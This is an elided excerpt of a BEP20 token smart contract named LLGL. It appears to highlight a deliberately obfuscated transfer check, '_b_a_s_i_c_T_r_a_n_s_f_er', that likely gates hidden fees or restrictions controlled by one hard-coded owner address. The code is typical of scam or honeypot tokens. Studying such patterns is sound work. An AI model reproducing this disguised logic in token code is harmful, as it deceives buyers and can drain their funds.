...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _b_a_s_i_c_T_r_a_n_s_f_er(address Laddress, address rAddress) internal view returns (bool){
    return (Laddress != rAddress) /*!=*/
    ||(isExcludedFromCut[Laddress] == false
    || false);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(_b_a_s_i_c_T_r_a_n_s_f_er(sender,recipient))
...
contract LLGL is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(3),uint256(0)],
        [uint256(1),uint256(9),uint256(0)],
        [uint256(100000000),uint256(100000000)],
        [0x0003577E153F03486B110C1797fd9EF349Eb0207,0x0003577E153F03486B110C1797fd9EF349Eb0207],
        0x0003577E153F03486B110C1797fd9EF349Eb0207
    ){}
}